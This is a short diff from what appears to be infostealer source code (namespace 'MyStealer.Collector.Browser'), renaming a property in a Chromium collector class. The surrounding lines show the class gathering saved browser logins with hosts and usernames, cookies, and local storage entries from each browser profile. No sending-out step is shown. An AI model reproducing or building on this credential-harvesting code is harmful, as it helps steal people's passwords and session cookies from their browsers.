@@ -13,7 +13,7 @@ namespace MyStealer.Collector.Browser
 {
     public class Chromium : BrowserCollectorBase
     {
-        public override string ModuleName => "Chromium";
+        public override string Name => "Chromium";
 
         public virtual bool HasProfiles => true;
 
@@ -162,7 +162,7 @@ namespace MyStealer.Collector.Browser
                                 count++;
                                 creds.Add(new BrowserLogin
                                 {
-                                    BrowserName = $"{ModuleName}",
+                                    BrowserName = $"{Name}",
                                     BrowserProfileName = profileName,
                                     Host = host,
                                     UserName = username,
@@ -242,7 +242,7 @@ namespace MyStealer.Collector.Browser
                                 count++;
                                 cookies.Add(new BrowserCookie
                                 {
-                                    BrowserName = ModuleName,
+                                    BrowserName = Name,
                                     BrowserProfileName = profileName,
                                     CreationDateTime = creationDate,
                                     LastAccessDateTime = accessDate,
@@ -290,7 +290,7 @@ namespace MyStealer.Collector.Browser
                     count++;
                     set.Add(new BrowserLocalStorage
                     {
-                        BrowserName = ModuleName,
+                        BrowserName = Name,
                         BrowserProfileName = profileName,
                         Host = record.StorageKey,
                         Key = record.ScriptKey,
